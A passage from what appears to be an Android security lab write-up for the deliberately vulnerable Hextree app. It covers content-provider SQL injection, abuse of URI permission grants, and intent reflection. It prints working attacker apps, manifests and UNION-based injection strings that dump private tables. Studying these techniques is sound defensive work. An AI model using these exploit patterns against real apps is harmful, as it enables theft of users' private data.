+<span id="cb33-11"><a href="#cb33-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-12"><a href="#cb33-12" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb33-13"><a href="#cb33-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onActivityResult</span><span class="op">(</span><span class="dt">int</span> requestCode<span class="op">,</span> <span class="dt">int</span> resultCode<span class="op">,</span> <span class="at">@Nullable</span> Intent data<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb33-14"><a href="#cb33-14" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onActivityResult</span><span class="op">(</span>requestCode<span class="op">,</span> resultCode<span class="op">,</span> data<span class="op">);</span></span>
+<span id="cb33-15"><a href="#cb33-15" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> flag <span class="op">=</span> <span class="bu">String</span><span class="op">.</span><span class="fu">valueOf</span><span class="op">(</span>data<span class="op">.</span><span class="fu">getFlags</span><span class="op">());</span></span>
+<span id="cb33-16"><a href="#cb33-16" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">,</span> flag<span class="op">);</span> <span class="co">// It will print &quot;1&quot;</span></span>
+<span id="cb33-17"><a href="#cb33-17" aria-hidden="true" tabindex="-1"></a>        Uri uri <span class="op">=</span> data<span class="op">.</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb33-18"><a href="#cb33-18" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;uri&quot;</span><span class="op">,</span> uri<span class="op">.</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb33-19"><a href="#cb33-19" aria-hidden="true" tabindex="-1"></a>        <span class="fu">dump</span><span class="op">(</span>uri<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span>
+<span id="cb33-20"><a href="#cb33-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb33-21"><a href="#cb33-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-22"><a href="#cb33-22" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">void</span> <span class="fu">dump</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> projection<span class="op">,</span> <span class="bu">String</span> selection<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb33-23"><a href="#cb33-23" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Output:</p>
+<pre><code>...  flag   ... D  1
+...  uri    ... D  content://io.hextree.flag33_1/flags
+...  evil   ... D  _id = 1, name = flag30, value = HXT{...}, visible = 1
+...  evil   ... D  _id = 2, name = flag31, value = HXT{...}, visible = 1
+...  evil   ... D  _id = 3, name = flag32, value = HXT{...}, visible = 0</code></pre>
+<p>Running this code successfully dumps the default flags table. However, to capture the final flag, we need to access a hidden “notes” table. A closer look at the <code>Flag33Provider1</code> source code reveals a SQL injection vulnerability because the app passes user-supplied parameters directly into <code>SQLiteDatabase.query()</code>.</p>
+<div class="sourceCode" id="cb35"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="bu">Cursor</span> <span class="fu">query</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> strArr<span class="op">,</span> <span class="bu">String</span> str<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> strArr2<span class="op">,</span> <span class="bu">String</span> str2<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a>    <span class="bu">StringBuilder</span> sbAppend <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">(</span><span class="st">&quot;Flag33Provider1.query(&#39;&quot;</span><span class="op">).</span><span class="fu">append</span><span class="op">(</span>uri<span class="op">.</span><span class="fu">getPath</span><span class="op">()).</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;&#39;): &quot;</span><span class="op">);</span></span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a>    UriMatcher uriMatcher2 <span class="op">=</span> uriMatcher<span class="op">;</span></span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a>    Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag33Provider1&quot;</span><span class="op">,</span> sbAppend<span class="op">.</span><span class="fu">append</span><span class="op">(</span>uriMatcher2<span class="op">.</span><span class="fu">match</span><span class="op">(</span>uri<span class="op">)).</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a>    SQLiteDatabase readableDatabase <span class="op">=</span> <span class="kw">this</span><span class="op">.</span><span class="fu">dbHelper</span><span class="op">.</span><span class="fu">getReadableDatabase</span><span class="op">();</span></span>
+<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> iMatch <span class="op">=</span> uriMatcher2<span class="op">.</span><span class="fu">match</span><span class="op">(</span>uri<span class="op">);</span></span>
+<span id="cb35-7"><a href="#cb35-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>iMatch <span class="op">!=</span> <span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb35-8"><a href="#cb35-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>iMatch <span class="op">==</span> <span class="dv">2</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb35-9"><a href="#cb35-9" aria-hidden="true" tabindex="-1"></a>            <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">IllegalArgumentException</span><span class="op">(</span><span class="st">&quot;access to Notes table not yet implemented&quot;</span><span class="op">);</span></span>
+<span id="cb35-10"><a href="#cb35-10" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb35-11"><a href="#cb35-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">IllegalArgumentException</span><span class="op">(</span><span class="st">&quot;Unknown URI: &quot;</span> <span class="op">+</span> uri<span class="op">);</span></span>
+<span id="cb35-12"><a href="#cb35-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb35-13"><a href="#cb35-13" aria-hidden="true" tabindex="-1"></a>    <span class="bu">Cursor</span> cursorQuery <span class="op">=</span> readableDatabase<span class="op">.</span><span class="fu">query</span><span class="op">(</span>FlagDatabaseHelper<span class="op">.</span><span class="fu">TABLE_FLAG</span><span class="op">,</span> strArr<span class="op">,</span> str<span class="op">,</span> strArr2<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> str2<span class="op">);</span></span>
+<span id="cb35-14"><a href="#cb35-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> cursorQuery<span class="op">;</span></span>
+<span id="cb35-15"><a href="#cb35-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>We can exploit modifying <code>onActivityResult()</code> method to inject a UNION query as show below:</p>
+<div class="sourceCode" id="cb36"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onActivityResult</span><span class="op">(</span><span class="dt">int</span> requestCode<span class="op">,</span> <span class="dt">int</span> resultCode<span class="op">,</span> <span class="at">@Nullable</span> Intent data<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">super</span><span class="op">.</span><span class="fu">onActivityResult</span><span class="op">(</span>requestCode<span class="op">,</span> resultCode<span class="op">,</span> data<span class="op">);</span></span>
+<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a>    Uri uri <span class="op">=</span> data<span class="op">.</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span><span class="op">[]</span> projection <span class="op">=</span> <span class="op">{</span><span class="st">&quot;name&quot;</span><span class="op">};</span></span>
+<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span> selection <span class="op">=</span> <span class="st">&quot;&#39;&#39; UNION SELECT content FROM Note&quot;</span><span class="op">;</span></span>
+<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a>    <span class="fu">dump</span><span class="op">(</span>uri<span class="op">,</span> projection <span class="op">,</span>selection<span class="op">);</span></span>
+<span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: Instead of using <code>onActivityResult()</code> we can simply wait for the permission grant by introducing a delay (<code>sleep</code>) immediately after starting the activity. This allows us to exploit the SQL injection directly within <code>onCreate()</code> once the permission has likely been granted.</p>
+<pre><code>protected void onCreate(Bundle savedInstanceState) {
+    ...
+    Intent intent = new Intent();
+    intent.setAction(&quot;io.hextree.FLAG33&quot;);
+    intent.setComponent(new ComponentName(&quot;io.hextree.attacksurface&quot;, &quot;io.hextree.attacksurface.activities.Flag33Activity1&quot;));
+    startActivityForResult(intent, 1);
+
+    try {
+        Thread.sleep(5000);
+
+        Uri uri = Uri.parse(&quot;content://io.hextree.flag33_1/flags&quot;);
+        String[] projection = {&quot;name&quot;};
+        String selection = &quot;&#39;&#39; UNION SELECT content FROM Note&quot;;
+        dump(uri, projection ,selection);
+
+    } catch (InterruptedException e) {
+        throw new RuntimeException(e);
+    }
+}</code></pre>
+</blockquote>
+<h3 id="access-to-a-not-exported-provider-2-sqli">Access to a not exported provider (2) (+ SQLi)</h3>
+<p>This example demonstrates SQLi in a non-exported provider by exploiting URI permission grants. In the previous example, we accessed the provider by capturing an intent returned via <code>setResult()</code>; however, that is not the only vector. When an application transmits an Intent via <code>startActivity</code>, <code>startService</code>, etc., and includes the <code>FLAG_GRANT_READ_URI_PERMISSION</code> or <code>FLAG_GRANT_WRITE_URI_PERMISSION</code>, the receiving application is granted access to the URI specified in the Intent’s data.</p>
+<p>Let’s start by analyzing the manifest for the <code>io.hextree.attacksurface</code> app. We see a <code>ContentProvider</code> defined as follows:</p>
+<div class="sourceCode" id="cb38"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.providers.Flag33Provider2&quot;</span></span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:enabled=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;false&quot;</span></span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;io.hextree.flag33_2&quot;</span></span>
+<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:grantUriPermissions=</span><span class="st">&quot;true&quot;</span>/&gt;</span></code></pre></div>
+<p>Notice that while <code>android:exported</code> is <code>false</code>, <code>android:grantUriPermissions</code> is set to <code>true</code> like in the example before. So now let’s take a look at the <code>Flag33Activity2</code>:</p>
+<div class="sourceCode" id="cb39"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag33Activity2&quot;</span></span>
+<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;false&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb40"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag33Activity2 <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">...</span></span>
+<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag33Activity2</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb40-7"><a href="#cb40-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb40-8"><a href="#cb40-8" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> stringExtra <span class="op">=</span> <span class="fu">getIntent</span><span class="op">().</span><span class="fu">getStringExtra</span><span class="op">(</span><span class="st">&quot;secret&quot;</span><span class="op">);</span></span>
+<span id="cb40-9"><a href="#cb40-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>stringExtra <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb40-10"><a href="#cb40-10" aria-hidden="true" tabindex="-1"></a>            Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb40-11"><a href="#cb40-11" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">setAction</span><span class="op">(</span><span class="st">&quot;io.hextree.FLAG33&quot;</span><span class="op">);</span></span>
+<span id="cb40-12"><a href="#cb40-12" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;content://io.hextree.flag33_2/flags&quot;</span><span class="op">));</span></span>
+<span id="cb40-13"><a href="#cb40-13" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">addFlags</span><span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb40-14"><a href="#cb40-14" aria-hidden="true" tabindex="-1"></a>            <span class="fu">startActivity</span><span class="op">(</span>intent<span class="op">);</span></span>
+<span id="cb40-15"><a href="#cb40-15" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb40-16"><a href="#cb40-16" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb40-17"><a href="#cb40-17" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb40-18"><a href="#cb40-18" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>We can exploit this vulnerability by creating an attacking application that listens for the <code>io.hextree.FLAG33</code> action. When the vulnerable app starts our activity, it passes the read permission along with it:</p>
+<div class="sourceCode" id="cb41"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;.MainActivity&quot;</span></span>
+<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb41-5"><a href="#cb41-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span>
+<span id="cb41-6"><a href="#cb41-6" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span>
+<span id="cb41-7"><a href="#cb41-7" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb41-8"><a href="#cb41-8" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb41-9"><a href="#cb41-9" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;io.hextree.FLAG33&quot;</span>/&gt;</span>
+<span id="cb41-10"><a href="#cb41-10" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span>
+<span id="cb41-11"><a href="#cb41-11" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">data</span><span class="ot"> android:scheme=</span><span class="st">&quot;content&quot;</span> /&gt;</span>
+<span id="cb41-12"><a href="#cb41-12" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb41-13"><a href="#cb41-13" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">activity</span>&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb42"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> AppCompatActivity <span class="op">{</span></span>
+<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb42-5"><a href="#cb42-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb42-6"><a href="#cb42-6" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb42-7"><a href="#cb42-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>intent<span class="op">.</span><span class="fu">getAction</span><span class="op">().</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;io.hextree.FLAG33&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb42-8"><a href="#cb42-8" aria-hidden="true" tabindex="-1"></a>            Uri uri <span class="op">=</span> intent<span class="op">.</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb42-9"><a href="#cb42-9" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span><span class="op">[]</span> projection <span class="op">=</span> <span class="op">{</span><span class="st">&quot;name&quot;</span><span class="op">,</span> <span class="st">&quot;value&quot;</span><span class="op">};</span></span>
+<span id="cb42-10"><a href="#cb42-10" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> selection <span class="op">=</span> <span class="st">&quot;&#39;&#39; UNION SELECT title, content FROM Note&quot;</span><span class="op">;</span></span>
+<span id="cb42-11"><a href="#cb42-11" aria-hidden="true" tabindex="-1"></a>            <span class="fu">dump</span><span class="op">(</span>uri<span class="op">,</span> projection <span class="op">,</span>selection<span class="op">);</span></span>
+<span id="cb42-12"><a href="#cb42-12" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb42-13"><a href="#cb42-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb42-14"><a href="#cb42-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb42-15"><a href="#cb42-15" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">void</span> <span class="fu">dump</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> projection<span class="op">,</span> <span class="bu">String</span> selection<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb42-16"><a href="#cb42-16" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<h3 id="hijacking-content-provider-access-with-intent-reflection">Hijacking content provider access with intent reflection</h3>
+<p>While apps can intentionally share access to Content Providers, sometimes apps can also be forced to do it unintentionally. Consider a scenario where an application receives an incoming Intent and simply returns it to the sender. In this case, we can simply start the activity using an Intent that targets a private Content Provider URI and includes the <code>FLAG_GRANT_READ_URI_PERMISSION</code> flag. By reflecting the Intent, the app grants the attacker access.</p>
+<div class="sourceCode" id="cb43"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag8Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb43-2"><a href="#cb43-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-3"><a href="#cb43-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb43-4"><a href="#cb43-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb43-5"><a href="#cb43-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb43-6"><a href="#cb43-6" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>callingActivity <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb43-7"><a href="#cb43-7" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>callingActivity<span class="op">.</span><span class="fu">getClassName</span><span class="op">().</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Hextree&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb43-8"><a href="#cb43-8" aria-hidden="true" tabindex="-1"></a>                <span class="kw">...</span></span>
+<span id="cb43-9"><a href="#cb43-9" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb43-10"><a href="#cb43-10" aria-hidden="true" tabindex="-1"></a>                Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag8&quot;</span><span class="op">,</span> <span class="st">&quot;access denied&quot;</span><span class="op">);</span></span>
+<span id="cb43-11"><a href="#cb43-11" aria-hidden="true" tabindex="-1"></a>                <span class="fu">setResult</span><span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="fu">getIntent</span><span class="op">());</span></span>
+<span id="cb43-12"><a href="#cb43-12" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb43-13"><a href="#cb43-13" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb43-14"><a href="#cb43-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb43-15"><a href="#cb43-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>When the caller is “denied”, <code>Flag8Activity</code> returns the incoming Intent as it is, including its data URI and flags. The grant is issued with the identity of the vulnerable app, so we can target any of its providers with <code>grantUriPermissions="true"</code>, even a non-exported one such as <code>io.hextree.flag33_2</code>:</p>
+<div class="sourceCode" id="cb44"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> AppCompatActivity <span class="op">{</span></span>
+<span id="cb44-2"><a href="#cb44-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb44-3"><a href="#cb44-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb44-4"><a href="#cb44-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb44-5"><a href="#cb44-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb44-6"><a href="#cb44-6" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb44-7"><a href="#cb44-7" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface&quot;</span><span class="op">,</span> <span class="st">&quot;io.hextree.attacksurface.activities.Flag8Activity&quot;</span><span class="op">);</span></span>
+<span id="cb44-8"><a href="#cb44-8" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Private provider URI + read grant: the victim will reflect both back to us</span></span>
+<span id="cb44-9"><a href="#cb44-9" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;content://io.hextree.flag33_2/flags&quot;</span><span class="op">));</span></span>
+<span id="cb44-10"><a href="#cb44-10" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">addFlags</span><span class="op">(</span>Intent<span class="op">.</span><span class="fu">FLAG_GRANT_READ_URI_PERMISSION</span><span class="op">);</span></span>
+<span id="cb44-11"><a href="#cb44-11" aria-hidden="true" tabindex="-1"></a>        <span class="co">// startActivityForResult() is required: otherwise getCallingActivity() is null</span></span>
+<span id="cb44-12"><a href="#cb44-12" aria-hidden="true" tabindex="-1"></a>        <span class="fu">startActivityForResult</span><span class="op">(</span>intent<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb44-13"><a href="#cb44-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb44-14"><a href="#cb44-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb44-15"><a href="#cb44-15" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb44-16"><a href="#cb44-16" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onActivityResult</span><span class="op">(</span><span class="dt">int</span> requestCode<span class="op">,</span> <span class="dt">int</span> resultCode<span class="op">,</span> <span class="at">@Nullable</span> Intent data<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb44-17"><a href="#cb44-17" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onActivityResult</span><span class="op">(</span>requestCode<span class="op">,</span> resultCode<span class="op">,</span> data<span class="op">);</span></span>
+<span id="cb44-18"><a href="#cb44-18" aria-hidden="true" tabindex="-1"></a>        <span class="co">// The returned Intent carries the grant: we can now query the private provider</span></span>
+<span id="cb44-19"><a href="#cb44-19" aria-hidden="true" tabindex="-1"></a>        <span class="fu">dump</span><span class="op">(</span>data<span class="op">.</span><span class="fu">getData</span><span class="op">());</span></span>
+<span id="cb44-20"><a href="#cb44-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb44-21"><a href="#cb44-21" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: our activity’s class name must not contain <code>Hextree</code>, otherwise the victim takes the other branch and doesn’t reflect the Intent.</p>
+</blockquote>
+<h3 id="vulnerability-in-consuming-content-providers">Vulnerability in consuming Content Providers</h3>
+<p>Previously, we examined vulnerabilities on the “sending” side where apps insecurely expose content. Now, we shift our focus to the “receiving” side. A significant threat model exists where applications expect to consume data from an external Content Provider. If the receiving app trusts the structure or content of the returned data without validation, it can be exploited.</p>
+<blockquote>
+<p><strong>Note</strong>: This example is derived from a <a href="https://offsecnotes.frankheat.io/Android/Application%20security/IPC/file%20provider.html#vulnerability-in-consuming-fileprovider">FileProvider vulnerability</a> and illustrates the implementation of a Content Provider.</p>
+</blockquote>
+<p>The target activity, <code>MainActivity</code>, accepts an Intent containing a URI. It queries this URI using a ContentResolver and expects the resulting Cursor to contain specific metadata:</p>
